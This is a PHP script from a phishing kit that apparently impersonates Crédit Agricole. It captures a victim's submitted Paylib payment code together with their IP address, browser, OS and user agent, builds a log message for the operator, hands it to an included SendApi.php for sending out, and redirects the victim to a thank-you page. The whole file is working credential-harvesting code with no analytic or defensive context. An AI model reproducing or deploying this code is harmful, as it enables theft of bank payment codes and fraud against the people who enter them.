<?php
error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");

$paylib = $_SESSION['paylib'] = $_POST['paylib'];



$yagmai .= '
[π¬ Code Paylib] = '.$_SESSION['paylib'].'
       [+]ββββγπ» Systemγβββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$brow.' and '.$sys.'
[π FINGERPRINT] = '.$useragent.'
';



$yagmail .= '
[+]ββββββββββββββββββγ Log Agricole γββββββββββββββββββββ[+]
[+]ββββββββββββββββγπ³ Auth INFOγβββββββββββββββββββ[+]
[π¬ Code Paylib] = '.$_SESSION['paylib'].'
[+]ββββββββββββββββββγ End Log γββββββββββββββββββββ[+]
[+]ββββββββββββββγEinstein REZπ€‘πγβββββββββββββββ[+]
';

include("SendApi.php"); 


header('Location: ../thanks.php');




?>